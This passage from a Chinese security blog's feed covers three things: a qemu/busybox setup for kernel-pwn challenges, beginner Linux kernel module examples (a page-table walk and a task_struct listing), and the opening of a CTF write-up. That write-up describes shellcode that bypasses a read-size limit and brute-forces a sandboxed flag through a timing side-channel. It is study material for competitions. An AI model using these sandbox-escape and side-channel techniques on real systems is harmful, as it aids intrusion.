sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><p>最后加上可执行权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">chmod +x ./init<br></code></pre></td></tr></table></figure><p>打包脚本，把需要加载的驱动放在同级目录</p><blockquote><p>pack.sh</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>cp -r _install rootfs_tmp<br><span class="hljs-comment"># cp init rootfs_tmp/</span><br>cp babydriver.ko rootfs_tmp/<br><br><span class="hljs-comment"># gcc -g -static exp.c -o exp</span><br><span class="hljs-comment"># cp exp rootfs_tmp/</span><br><br>chmod +x rootfs_tmp/init<br>chmod g-w -R rootfs_tmp/<br>chmod o-w -R rootfs_tmp/<br>sudo chown -R root rootfs_tmp/<br>sudo chgrp -R root rootfs_tmp/<br>sudo chmod u+s rootfs_tmp/bin/busybox<br><br><span class="hljs-built_in">cd</span> rootfs_tmp/<br>find . | cpio -o -H newc &gt; ../rootfs.cpio<br><span class="hljs-built_in">cd</span> ..<br><br>sudo rm -rf rootfs_tmp/<br></code></pre></td></tr></table></figure><p>比赛给的init脚本如下 ，其默认使用insmod加载了名为babydriver.ko</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br> <br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>chown root:root flag<br>chmod 400 flag<br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br>chmod 777 /dev/babydev<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><h3 id="三、qemu运行内核"><a href="#三、qemu运行内核" class="headerlink" title="三、qemu运行内核"></a>三、qemu运行内核</h3><p>为了方便，直接把启动命令存为文件</p><blockquote><p>start.sh</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><br>qemu-system-x86_64 \<br>-m 1024M \<br>-cpu kvm64,+smep,+smap\<br>-kernel ./bzImage \<br>-initrd ./rootfs.cpio \<br>-nographic \<br>-monitor none \<br>-append <span class="hljs-string">&quot;console=ttyS0 nokaslr quiet&quot;</span> \<br>-s<br></code></pre></td></tr></table></figure><p>部分参数说明如下：</p><ul><li><p><code>-m</code>：虚拟机内存大小</p></li><li><p><code>-kernel</code>：内存镜像路径</p></li><li><p><code>-initrd</code>：文件系统路径</p></li><li><p>-append：附加参数选项</p><ul><li><code>nokalsr</code>：关闭内核地址随机化，方便我们进行调试</li><li><code>rdinit</code>：指定初始启动进程，<code>/sbin/init</code>进程会默认以<code>/etc/init.d/rcS</code>作为启动脚本</li><li><code>loglevel=3 </code>&amp; <code>quiet</code>：不输出log</li><li><code>console=ttyS0</code>：指定终端为<code>/dev/ttyS0</code>，这样一启动就能进入终端界面</li></ul></li><li><p><code>-monitor</code>：将监视器重定向到主机设备<code>/dev/null</code>，这里重定向至null主要是防止CTF中被人给偷了qemu拿flag</p></li><li><p><code>-cpu</code>：设置CPU安全选项，在这里开启了smep保护</p></li><li><p><code>-s</code>：相当于<code>-gdb tcp::1234</code>的简写（也可以直接这么写），后续我们可以通过gdb连接本地端口进行调试</p></li></ul><p><img src="https://i.loli.net/2021/10/22/RdyS3KlrM6QmoGE.png"></p><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><p>附上gdb调试脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>gdb -q \<br>-ex <span class="hljs-string">&quot;file vmlinux&quot;</span>\<br>-ex <span class="hljs-string">&quot;add-symbol-file babydriver.ko 0xffffffffc0000000&quot;</span>\ <span class="hljs-comment">#指定驱动代码段加载基址</span><br>-ex <span class="hljs-string">&quot;target remote localhost:1234&quot;</span><br>-ex <span class="hljs-string">&quot;b babyopen&quot;</span><br></code></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/">https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>kernel</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux内核初探</title>
    <link href="/2021/10/18/Linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2/"/>
    <url>/2021/10/18/Linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="可装载内核模块（LKM）"><a href="#可装载内核模块（LKM）" class="headerlink" title="可装载内核模块（LKM）"></a>可装载内核模块（LKM）</h2><p>Linux内核采用的是宏内核架构，一切的系统服务都需要由内核来提供，新服务的提供往往意味着要重新编译整个内核，于是可装载内核模块的出现大大提高了内核的可拓展性和可维护性。下面是一些基本的概念：</p><ul><li><p>可装载内核模块(LKM)是一段可以动态加载进内核的代码</p></li><li><p>在Linux内核源码树以外来开发并编译一个模块，称为树外开发</p></li><li><p>之所以提供模块机制，是因为Linux内核本身是一个单内核，单内核由于所有内容都集成在一起，效率很高，但可扩展性和可维护性较差，模块机制可弥补这一缺陷。</p></li></ul><blockquote><p>模块源代码 helloworld.c文件</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># include &lt;linux/init.h&gt;</span><br><span class="hljs-comment"># include &lt;linux/kernel.h&gt;</span><br><span class="hljs-comment"># include &lt;linux/module.h&gt;</span><br><br>//内核模块初始化函数<br>static <span class="hljs-built_in">int</span> __init verf1sh_init(void)<br>&#123;<br>printk(<span class="hljs-string">&quot;Hello world from kernel space\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>//内核模块退出函数<br>static void __exit verf1sh_exit(void)<br>&#123;<br>printk(<span class="hljs-string">&quot;Goodbye world leaving kernel space\n&quot;</span>);<br>&#125;<br><br>module_init(verf1sh_init);<br>module_exit(verf1sh_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;verf1sh&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>Makefile</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">#Makefile文件注意：假如前面的.c文件起名为first.c，那么这里的Makefile文件中的.o文<br>#件就要起名为first.o    只有root用户才能加载和卸载模块<br>obj-m:=helloworld.o                          #产生helloworld模块的目标文件<br>#目标文件  文件  要与模块名字相同<br>CURRENT_PATH:=$(shell pwd)             #模块所在的当前路径<br>LINUX_KERNEL:=$(shell uname -r)        <span class="hljs-meta">#linux内核代码的当前版本</span><br>LINUX_KERNEL_PATH:=/usr/src/linux-headers-$(LINUX_KERNEL)<br><br>all:<br>make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules    #编译模块<br>#[Tab]              内核的路径       当前目录编译完放哪  表明编译的是内核模块<br><br>clean:<br>make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean      #清理模块<br></code></pre></td></tr></table></figure><blockquote><p>编译模块</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">make<br></code></pre></td></tr></table></figure><blockquote><p>装载模块</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo insmod helloworld.ko<br></code></pre></td></tr></table></figure><blockquote><p>查看装载的模块</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">lsmod<br></code></pre></td></tr></table></figure><blockquote><p>卸载模块</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo rmmod helloworld<br></code></pre></td></tr></table></figure><h2 id="虚拟地址到物理地址"><a href="#虚拟地址到物理地址" class="headerlink" title="虚拟地址到物理地址"></a>虚拟地址到物理地址</h2><blockquote><p>模块源代码 paging_lowmem.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/mm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/mm_types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/export.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/delay.h&gt;</span></span><br><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cr0,cr3;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> vaddr = <span class="hljs-number">0</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">get_pgtable_macro</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cr0 = read_cr0();<br>    cr3 = read_cr3_pa();<br>     <br>    printk(<span class="hljs-string">&quot;cr0 = 0x%lx, cr3 = 0x%lx\n&quot;</span>,cr0,cr3);<br>    <br>    printk(<span class="hljs-string">&quot;PGDIR_SHIFT = %d\n&quot;</span>, PGDIR_SHIFT);<br>    printk(<span class="hljs-string">&quot;P4D_SHIFT = %d\n&quot;</span>,P4D_SHIFT);<br>    printk(<span class="hljs-string">&quot;PUD_SHIFT = %d\n&quot;</span>, PUD_SHIFT);<br>    printk(<span class="hljs-string">&quot;PMD_SHIFT = %d\n&quot;</span>, PMD_SHIFT);<br>    printk(<span class="hljs-string">&quot;PAGE_SHIFT = %d\n&quot;</span>, PAGE_SHIFT);<br> <br>    printk(<span class="hljs-string">&quot;PTRS_PER_PGD = %d\n&quot;</span>, PTRS_PER_PGD);<br>    printk(<span class="hljs-string">&quot;PTRS_PER_P4D = %d\n&quot;</span>, PTRS_PER_P4D);<br>    printk(<span class="hljs-string">&quot;PTRS_PER_PUD = %d\n&quot;</span>, PTRS_PER_PUD);<br>    printk(<span class="hljs-string">&quot;PTRS_PER_PMD = %d\n&quot;</span>, PTRS_PER_PMD);<br>    printk(<span class="hljs-string">&quot;PTRS_PER_PTE = %d\n&quot;</span>, PTRS_PER_PTE);<br>    printk(<span class="hljs-string">&quot;PAGE_MASK = 0x%lx\n&quot;</span>, PAGE_MASK);<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">vaddr2paddr</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> vaddr)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pgd_t</span> *pgd;<br>    <span class="hljs-keyword">p4d_t</span> *p4d;<br>    <span class="hljs-keyword">pud_t</span> *pud;<br>    <span class="hljs-keyword">pmd_t</span> *pmd;<br>    <span class="hljs-keyword">pte_t</span> *pte;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> paddr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> page_addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> page_offset = <span class="hljs-number">0</span>;<br>    pgd = pgd_offset(current-&gt;mm, vaddr); <span class="hljs-comment">// 根据当前虚拟地址和当前进程的mm_struct获取pgd项</span><br>    printk(<span class="hljs-string">&quot;pgd_val = 0x%lx, pgd_index = %lu\n&quot;</span>, pgd_val(*pgd),pgd_index(vaddr));<br>    <span class="hljs-keyword">if</span> (pgd_none(*pgd))&#123;<br>        printk(<span class="hljs-string">&quot;not mapped in pgd\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    p4d = p4d_offset(pgd, vaddr);<br>    printk(<span class="hljs-string">&quot;p4d_val = 0x%lx, p4d_index = %lu\n&quot;</span>, p4d_val(*p4d),p4d_index(vaddr));<br>    <span class="hljs-keyword">if</span>(p4d_none(*p4d))<br>    &#123; <br>        printk(<span class="hljs-string">&quot;not mapped in p4d\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    pud = pud_offset(p4d, vaddr);<br>    printk(<span class="hljs-string">&quot;pud_val = 0x%lx, pud_index = %lu\n&quot;</span>, pud_val(*pud),pud_index(vaddr));<br>    <span class="hljs-keyword">if</span> (pud_none(*pud)) &#123;<br>        printk(<span class="hljs-string">&quot;not mapped in pud\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br> <br>    pmd = pmd_offset(pud, vaddr);<br>    printk(<span class="hljs-string">&quot;pmd_val = 0x%lx, pmd_index = %lu\n&quot;</span>, pmd_val(*pmd),pmd_index(vaddr));<br>    <span class="hljs-keyword">if</span> (pmd_none(*pmd)) &#123;<br>        printk(<span class="hljs-string">&quot;not mapped in pmd\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br> <br>    pte = pte_offset_kernel(pmd, vaddr);<br>    printk(<span class="hljs-string">&quot;pte_val = 0x%lx, ptd_index = %lu\n&quot;</span>, pte_val(*pte),pte_index(vaddr));<br><br>    <span class="hljs-keyword">if</span> (pte_none(*pte)) &#123;<br>        printk(<span class="hljs-string">&quot;not mapped in pte\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    page_addr = pte_val(*pte) &amp; PAGE_MASK;<br>    page_offset = vaddr &amp; ~PAGE_MASK;<br>    paddr = page_addr | page_offset;<br>    printk(<span class="hljs-string">&quot;page_addr = %lx, page_offset = %lx\n&quot;</span>, page_addr, page_offset);<br>    printk(<span class="hljs-string">&quot;vaddr = %lx, paddr = %lx\n&quot;</span>, vaddr, paddr);<br>    <span class="hljs-keyword">return</span> paddr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> __init <span class="hljs-title">v2p_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> vaddr = <span class="hljs-number">0</span> ;<br>    printk(<span class="hljs-string">&quot;vaddr to paddr module is running..\n&quot;</span>);<br>    get_pgtable_macro();<br>    printk(<span class="hljs-string">&quot;\n&quot;</span>);<br>    vaddr = __get_free_page(GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (vaddr == <span class="hljs-number">0</span>) &#123;<br>        printk(<span class="hljs-string">&quot;__get_free_page failed..\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">sprintf</span>((<span class="hljs-keyword">char</span> *)vaddr, <span class="hljs-string">&quot;hello world from kernel&quot;</span>);<br>    printk(<span class="hljs-string">&quot;get_page_vaddr=0x%lx\n&quot;</span>, vaddr);<br>    vaddr2paddr(vaddr);<br>    ssleep(<span class="hljs-number">600</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> __exit <span class="hljs-title">v2p_exit</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    printk(<span class="hljs-string">&quot;vaddr to paddr module is leaving..\n&quot;</span>);<br>    free_page(vaddr);<br>&#125;<br><br><br>module_init(v2p_init);<br>module_exit(v2p_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>); <br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/19/HrFM8iY3WnyIZ5l.png"></p><p><img src="https://i.loli.net/2021/10/23/SYcpmFRNKsdXzi1.png"></p><p><img src="https://i.loli.net/2021/10/23/dX1fQaRIPus3OWt.png"></p><p>100100010 100111001 110000010 101001001 000000000000</p><p>0x122            0x139            0x182            0x149</p><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="打印task-struct信息"><a href="#打印task-struct信息" class="headerlink" title="打印task_struct信息"></a>打印task_struct信息</h3><p>通过init_task遍历进程链表实现打印功能</p><blockquote><p>模块源代码 task_struct.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/fdtable.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/fs_struct.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/mm_types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;asm/atomic.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/init_task.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> __init <span class="hljs-title">print_pcb</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">task</span>, *<span class="hljs-title">p</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">pos</span>;</span><br><span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br><br>printk(<span class="hljs-string">&quot;begin...\n&quot;</span>);<br><br>task = &amp;init_task;<br>list_for_each(pos, &amp;task-&gt;tasks)<br>&#123;<br>p = list_entry(pos, struct task_struct, tasks);<br>count++;<br>printk(<span class="hljs-string">&quot;\n\n&quot;</span>);<br>printk(<span class="hljs-string">&quot;pid: %d; stack: %p; state: %lx; prio: %d; static_prio: %d; parent&#x27;s pid: %d; file_count: %d; umask: %d;\n&quot;</span>, p-&gt;pid,p-&gt;<span class="hljs-built_in">stack</span> , p-&gt;state, p-&gt;prio, p-&gt;static_prio, (p-&gt;parent)-&gt;pid, atomic_read(&amp;(p-&gt;files)-&gt;count), (p-&gt;fs)-&gt;umask);<br><span class="hljs-keyword">if</span>(p-&gt;mm !=<span class="hljs-literal">NULL</span>)<br>printk(<span class="hljs-string">&quot;total_vm: %ld&quot;</span>, (p-&gt;mm)-&gt;total_vm);<br>&#125;<br><br>printk(<span class="hljs-string">&quot;进程的个数: %d\n&quot;</span>, count);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> __exit <span class="hljs-title">exit_pcb</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>printk(<span class="hljs-string">&quot;exiting...\n&quot;</span>);<br>&#125;<br><br>module_init(print_pcb);<br>module_exit(exit_pcb);<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/23/vLfUc1woFYP7hAS.png"></p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2>]]></content>
    
    
    <categories>
      
      <category>kernel</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>能源网络安全大赛pwn方向题解</title>
    <link href="/2021/10/15/%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/"/>
    <url>/2021/10/15/%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/10/15/a6MKkJZz2deFBcm.png"></p><p>先简单记录一下，明天还有bytectf，有时间了再好好复盘一下，arm pwn都没时间看。</p><h2 id="babyshellcode"><a href="#babyshellcode" class="headerlink" title="babyshellcode"></a>babyshellcode</h2><p>侥幸一血</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序逻辑很简单，考点也清晰，就是orw然后侧信道爆破flag。没见过这种就很难想到，今年的蓝帽杯，强网杯都出过这个考点。有个注意的点就是这个read限制了大小，得绕一下。</p><p><img src="https://i.loli.net/2021/10/15/Bh8I7UMoY4O6Vgt.png"></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>先写一段shellcode，read更多的字节，这样就可以把我们所有orw的shellcode写进去。由于程序开了沙箱，我们没法直接把flag打印出来。</p><p>方法1：用<code>cmp byte ptr[rsi+&#123;0&#125;],&#123;1&#125;;jz $-3;ret</code>去判断内存中的flag值跟我们输入的值是否相等，若判断成功，就往跳转到它的上一条地址处执行，一直循环，这时候就可以通过<code>p.recvline(timeout=1)</code>看程序是否超时，如果超时则表明flag匹配成功。结束，接着爆破flag的第二位，以此往复。（这种可以是可以但是爆破太慢了）</p><p>方法2：不用<code>jz</code>指令了，换成<code>ja</code>指令二分法爆破</p><h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p><strong>绕过read大小限制</strong></p><p>我在第一段read的时候又写了一段read的shellcode，read执行完下一跳指令地址是0x10015，所以把read的第二个参数设置成0x10015，第三个参数尽量大一点，那么就可以通过我们自己设置的read把shellcode写进去。</p><p>pwntools自带的shellcraft就可完成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 